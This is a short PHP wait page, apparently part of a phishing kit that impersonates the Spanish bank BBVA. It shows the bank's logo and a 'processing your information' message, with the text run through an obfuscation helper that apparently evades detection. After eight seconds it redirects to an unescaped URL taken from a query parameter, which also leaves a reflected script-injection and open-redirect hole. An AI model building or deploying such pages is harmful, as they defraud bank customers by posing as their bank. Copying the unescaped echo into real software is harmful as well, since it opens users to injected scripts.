<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Espera...</title>
    <link rel="stylesheet" href="inc/style/style.css">
</head>
<body>
<section>
<div class="box">
<div class="logo"><img src="inc/images/bbva-blue.png"></div>
<div class="title"><?php $m->obf("Estamos procesando tu información..."); ?> <br> <?php $m->obf("por favor, espera."); ?></div>
<div class="load"><img src="inc/images/loading.gif"></div>
</div>
</section>
<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 
</body>
</html>